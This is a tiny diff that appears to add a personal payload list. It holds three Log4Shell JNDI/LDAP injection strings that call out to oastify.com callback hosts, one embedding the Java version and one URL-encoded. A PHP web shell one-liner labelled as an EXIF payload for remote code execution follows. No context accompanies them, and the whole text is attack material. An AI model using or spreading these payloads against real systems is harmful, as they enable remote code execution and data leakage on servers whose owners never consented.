@@ -1,0 +1,7 @@
+
+${jndi:ldap://c${java:version}.aesmhhufc0ispa3qlwa6hs7w6ncf0fo4.oastify.com/xyz}
+${jndi:ldap://j7r5oob27qk2mvzwyxumv5mbr2xtlj98.oastify.com}
+%24%7bjndi%3aldap%3a%2f%2fpyrcw46pwtquwjl9dzduw0jaj1psdi17.oastify.com%7d
+
+exif payload for rce
+comment : <?=`$_GET[x]`?>
